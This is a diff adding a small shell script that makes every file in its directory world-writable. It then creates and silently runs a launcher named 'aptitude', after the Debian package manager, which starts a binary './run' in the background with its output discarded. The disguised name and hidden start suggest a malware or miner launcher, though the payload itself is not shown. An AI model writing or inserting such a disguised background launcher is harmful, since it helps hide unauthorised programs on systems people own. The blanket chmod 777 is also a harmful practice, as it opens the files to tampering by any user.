@@ -1,0 +1,16 @@
+#!/bin/sh
+pwd > dir.dir
+dir=$(cat dir.dir)
+cd $dir
+chmod 777 *
+rm -rf n
+echo "1">n
+
+echo "#!/bin/sh
+cd $dir
+./run &>/dev/null" > aptitude
+chmod u+x aptitude
+chmod 777 *
+./aptitude >> /dev/null &
+
+exit 0
